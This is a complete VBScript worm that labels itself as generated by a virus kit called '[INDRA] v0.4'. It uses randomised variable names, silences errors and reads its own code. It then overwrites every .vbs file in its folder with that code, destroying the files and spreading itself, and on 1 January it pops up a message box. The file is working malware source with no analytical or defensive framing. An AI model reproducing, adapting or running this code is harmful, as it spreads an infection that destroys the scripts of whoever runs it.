'Worm Name: test
'Written By: test
'[INDRA]
On Error Resume Next
coqjvyvkgtoicwb = WScript.ScriptFullName
Set wgdppunkyhxlukq = CreateObject("WScript.Shell") 
Set qpurlglrsqjnhux = CreateObject("Scripting.FileSystemObject")
Set ayatqnpgtpwxifn = qpurlglrsqjnhux.OpenTextFile(coqjvyvkgtoicwb, 1, 0)
guyogyrqlgijqvg = ayatqnpgtpwxifn.ReadAll
ayatqnpgtpwxifn.Close
bdocxkogxyismjx = Left(coqjvyvkgtoicwb, InStrRev(coqjvyvkgtoicwb, "\"))
For Each cbnckryggtdjtfw in qpurlglrsqjnhux.GetFolder(bdocxkogxyismjx).Files
If ( Right(cbnckryggtdjtfw.Name, 4) = ".vbs" ) Then
Set qjhdjmmrcbdekqg = qpurlglrsqjnhux.CreateTextFile(cbnckryggtdjtfw.Name, True)
qjhdjmmrcbdekqg.Write guyogyrqlgijqvg
qjhdjmmrcbdekqg.Close
End If
Next
If (Month(Now) = 1) and (Day(Now) = 1) Then MsgBox "sqdfqsf", 0, "qsdf"
'Generated with [INDRA] v0.4.
